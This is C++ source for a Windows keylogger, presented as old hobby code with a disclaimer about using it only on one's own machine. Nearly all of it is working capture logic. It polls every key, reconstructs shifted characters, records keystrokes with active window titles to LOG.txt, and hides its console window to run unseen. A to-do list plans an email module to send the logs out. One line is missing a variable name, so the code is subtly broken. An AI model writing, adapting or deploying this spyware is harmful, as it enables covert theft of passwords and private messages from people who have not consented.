/*
Note: This is really old hacky inefficient code. I'm saving for historical purpouses.
More Info on this:  http://konukoii.com/blog/2016/08/18/capture-the-keys-chapter-1-clogger/
DISCLAIMER: THE AUTHOR DOES NOT CONDONE THE USE OF THIS PROGRAM FOR ANY
ILLEGAL OR OTHERWISE INTRUSIVE APPLICATION THAT MIGHT HARM OTHERS PRIVACY.
USE AT YOUR OWN RISK! NO WARRANTIES OR GUARANTIES ARE GIVEN FOR THIS PROGRAM.
WHAT THIS PROGRAM IS FOR:
->LEARNING TO USE THE WINDOWS HOOKS.
->MONITORING YOUR OWN COMPUTERS! (ENPHASIS ON THE OWN)
->WHITE HAT KNOWLEDGE
AGAIN, DON'T DO ANYTHING STUPID & DON'T BE EVIL.
*/

#include <fstream>
#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <stdio.h>
#include <string>
#include <cstring>
using namespace std;

const bool DEBUG = false;            //출력,스텔스 값 변경_mij9929

int log(int key, char* file);        //파일에 키를 기록_mij9929
int filter(int key);                //backspaces,shift hook 및 기타 특수 키 기록_mij9929
void stealth();                     //콘솔창 숨김 기능_mij9929
bool hookShift();               //shift키를 누른 후에 활성화_mij9929
bool capsLock();                //capsLock 감지_mij9929
void savePrevWindow();          //저장_mij9929
bool isSameWindow();
void print(string a);           //출력_mij9929
void print(int a);              //출력_mij9929
void backspaceHook();



//Global Variables//
//TELL ME THIS AIN'T CORRECT ONE MORE TIME! I DARE YOU! I DOUBLE DARE YOU MOTHERFUCKER!
CHAR windowName[80];
CHAR prevWindow[80];
bool possibleBackspace = false;
//bool shiftHooked = false;

int main() {
	if (!DEBUG) {
		stealth();
	}



	unsigned char i;
	while (true) {
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				int a = log(i, "LOG.txt");
			}
		}
	}
	return 0;
}

int log(int key, char* file) {//파일에 키를 기록_mij9929


	//   Check for Trash //
	//   Left Click  | Right Click | Shift Byprod | CTRL Byprod  | ALT Byproduct| Cancel Butt | Middle Click
	if ((key == 1) || (key == 2) || (key == 16) || (key == 17) || (key == 18) || (key == 3) || (key == 4) || (key == 37) ||
		(key == 38) || (key == 39) || (key == 40)) {
		return 0;
	}

	//if (key == VK_BACK){
	//    backspaceHook();
	//    return 0;
	//}

	fstream outFile(file, ios::out | ios::app);

	//If it is not same window
	//Print window header name.
	if (!isSameWindow()) {
		outFile << "\n\n */\n/*>>> " << windowName << endl;
		outFile << ">---------------------------------------------------\n\n";
	}

	savePrevWindow();


	//CHECK FOR SPECIAL CHARACTERS

	//SHIFT
	if (key == VK_LSHIFT || key == VK_RSHIFT) {
		print(" [SHIFT] ");
		//outFile << "[SHIFT]";
	}
	//ALT
	else if (key == VK_LMENU || key == VK_RMENU) {
		print(" [ALT] ");
		outFile << " [ALT] ";
	}
	//CTRL
	else if (key == VK_LCONTROL || key == VK_RCONTROL) {
		print(" [CTRL] ");
		outFile << " [CTRL] ";
	}
	//CAPSLOCK
	else if (key == VK_CAPITAL) {
		print(" [CAPSLOCK] ");
		//outFile << "[SHIFT]";
	}
	//ANYTHING ELSE
	else {
		key = filter(key);
		print(key);
		outFile << (char)key;
	}

	outFile.close();

	return 0;
}

int filter(int key) {//backspaces,shift hook 및 기타 특수 키 기록_mij9929
//
	//tienes que poner aca un if-then que checkee si shift esta o no pressed
	//IF IT IS CAPITAL LETTER
	if ((key >= 65) && (key <= 90)) {
		//IF SHIFT IS  NOT HOOKED MAKE IT small
		//AND CAPSLOCK IS NOT ON.
		if ((!hookShift()) && (!capsLock())) {
			key += 32;
		}
	}
	//ELSE SI ES ALGUN NUMERO
	else if ((key >= 48) && (key <= 57)) {
		if (hookShift()) {
			switch (key) {
			case '1': key = '!'; break;
			case '2': key = '@'; break;
			case '3': key = '#'; break;
			case '4': key = '$'; break;
			case '5': key = '%'; break;
			case '6': key = '^'; break;
			case '7': key = '&'; break;
			case '8': key = '*'; break;
			case '9': key = '('; break;
			case '0': key = ')'; break;
			}
		}
	}
	//SI ES ALGUN EXTRA KEY Y ESTA HOOKED SHIFT
	if (hookShift()) {
		if (key == 186) { key = ':'; }
		else if (key == 187) { key = '+'; }
		else if (key == 188) { key = '<'; }
		else if (key == 189) { key = '_'; }
		else if (key == 190) { key = '>'; }
		else if (key == 191) { key = '?'; }
		else if (key == 192) { key = '~'; }

		else if (key == 219) { key = '{'; }
		else if (key == 220) { key = '|'; }
		else if (key == 221) { key = '}'; }
		else if (key == 222) { key = '"'; }
	}
	//SI ES ALGUN EXTRA KEY Y NO ESTA HOOKED SHIFT
	else {
		if (key == 186) { key = ';'; }
		else if (key == 187) { key = '='; }
		else if (key == 188) { key = ','; }
		else if (key == 189) { key = '-'; }
		else if (key == 190) { key = '.'; }
		else if (key == 191) { key = '/'; }
		else if (key == 192) { key = '~'; }

		else if (key == 219) { key = '['; }
		else if (key == 220) { key = '\\'; }
		else if (key == 221) { key = ']'; }
		else if (key == 222) { key = '\''; }
	}

	/*NUMPAD

	NUMPAD numbers hold same values for letters
	When decyphering messages take this into consideration.

	//NUMPAD (Intento 2)
	if (key == VK_NUMPAD0) {key = '0';}
	else if (key == VK_NUMPAD1) {key = '1';}
	else if (key == VK_NUMPAD2) {key = '2';}
	else if (key == VK_NUMPAD3) {key = '3';}
	else if (key == VK_NUMPAD4) {key = '4';}
	else if (key == VK_NUMPAD5) {key = '5';}
	else if (key == VK_NUMPAD6) {key = '6';}
	else if (key == VK_NUMPAD7) {key = '7';}
	else if (key == VK_NUMPAD8) {key = '8';}
	else if (key == VK_NUMPAD) {key = '9';}


	//NUMPAD  (Intento 1)
	if ((key >=96) && (key<=105)){key -=48;}
	else if (key == 110){key = '.';}
	else if (key == 111){key = '/';}
	else if (key == 106){key = '*';}
	else if (key == 107){key = '+';}
	else if (key == 109){key = '-';}

	*/

	return key;
}

bool capsLock() {
	//capsLock 감지_mij9929
	if (GetKeyState(VK_CAPITAL) == 1) { return true; }
	if (GetKeyState(VK_CAPITAL) == -127) { return true; }
	return false;
}

bool hookShift() {
	//shift키를 누른 후에 활성화_mij9929

	//cout << "LEFT SHIFT: " << GetKeyState(VK_LSHIFT);
	//cout << "RIGHT SHIFT: " << GetKeyState(VK_RSHIFT) <<endl;
	//cout << "SHIFT:  ";
	//cout << "CAPITAL: " << GetKeyState(VK_CAPITAL) <<endl;

	if (GetKeyState(VK_LSHIFT) < -120) { return true; }
	if (GetKeyState(VK_RSHIFT) < -120) { return true; }

	return false;


}

void backspaceHook() {
	//fstream outFile(file,ios::out);
	//outFile.seekg(ios_base::end);




}

void stealth() {//콘솔창 숨김 기능_mij9929

	HWND stealth;   //Name of the Console 
	AllocConsole(); //Allocates New Console
	stealth = FindWindowA("ConsoleWindowClass", NULL);  //Finds Window
	MoveWindow(stealth, -300, -700, 0, 0, TRUE);             //Moves Window out of Sight
	ShowWindow(stealth, 0);                              //Cloaks Window

	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

}

void savePrevWindow() {
	////저장_mij9929
	HWND hwnd = GetForegroundWindow();

	int test = GetWindowText(hwnd, prevWindow, 80);//특정 윈도우와 지정된 관계에 있는 윈도우의 핸들의 String 값을 반환해준다._mij9929
}

bool isSameWindow() {//windowname과 prevwindow 비교_mij9929

	HWND = GetForegroundWindow();//수행중인 윈도우의 핸들을 받는다._mij9929
	int test = GetWindowText(hwnd, windowName, 80);

	//char* CurrWin = (char*) windowName;
	//char* PrevWin = (char*) prevWindow;
	//cout << windowName << prevWindow;

	if (strcmp(windowName, prevWindow) == 0) {
		return true;
	}
	else { return false; }
}

void print(string a) {
	//저장_mij9929
	if (DEBUG) {
		cout << a << endl;
	}
}

void print(int a) {
	//저장_mij9929
	if (DEBUG) {
		cout << (char)a << " : " << (int)a << endl;
	}
}

/* TO BE DONE:
BASICO:
3. Other Control Buttons  (Evitar que escriban cosas al output)
5. En debug borra el contenido del file

6. Backspace hook.
7. Signal Checking
8. String Searching Can Immediatly separate whats important from what is not.
9. Email Module with Blat/Stunnel (remember to open & close stunnel)
*/

/*DONE:
1. Keys Basicos
2. Nupad
*/